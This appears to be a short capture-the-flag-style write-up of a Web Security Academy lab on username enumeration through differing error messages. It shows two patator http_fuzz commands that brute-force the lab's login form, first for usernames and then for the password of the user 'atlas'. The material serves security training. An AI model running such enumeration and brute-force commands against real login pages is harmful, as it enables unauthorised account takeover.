# Username enumeration via different responses

As we know the lab is vulnerable to username enumeration and password brute-force attacks, I used patator to achieve our goal. First we start off with getting required data for patator to execute an attack. 

### Getting error printed out on providing invalid creds

![image](https://user-images.githubusercontent.com/86168235/126813802-b70e4a38-8ed8-406e-9308-a05b34bf03ea.png)

### Getting the POST request body with burp proxy intercept 

![image](https://user-images.githubusercontent.com/86168235/126814070-5ef1a706-11a8-4a9c-9131-cc5023e50fd4.png)


## Getting a valid username

#### Command used

```
patator http_fuzz url=https://target-acad1f081f80499780e23f5700b70008.web-security-academy.net/login method=POST body='username=FILE0&password=lkshfklj' \
0=usernames.txt follow=1 accept_cookie=1 -x ignore:fgrep="Invalid username"
```

## Getting a valid password

We requre the error message printed out by the website on providing invalid password for patator to work. 

![image](https://user-images.githubusercontent.com/86168235/126814438-cfc246c8-f6dc-44de-a5d3-34dff4d2d80a.png)

#### Command used

```
patator http_fuzz url=https://target-acad1f081f80499780e23f5700b70008.web-security-academy.net/login method=POST body='username=atlas&password=FILE0' \   
0=passwords.txt follow=1 accept_cookie=1 -x ignore:fgrep="Incorrect password"
```

## Screenshot

![image](https://user-images.githubusercontent.com/86168235/126814801-9e03f40b-b2c8-4d24-a12f-2d535e8e6c4d.png)

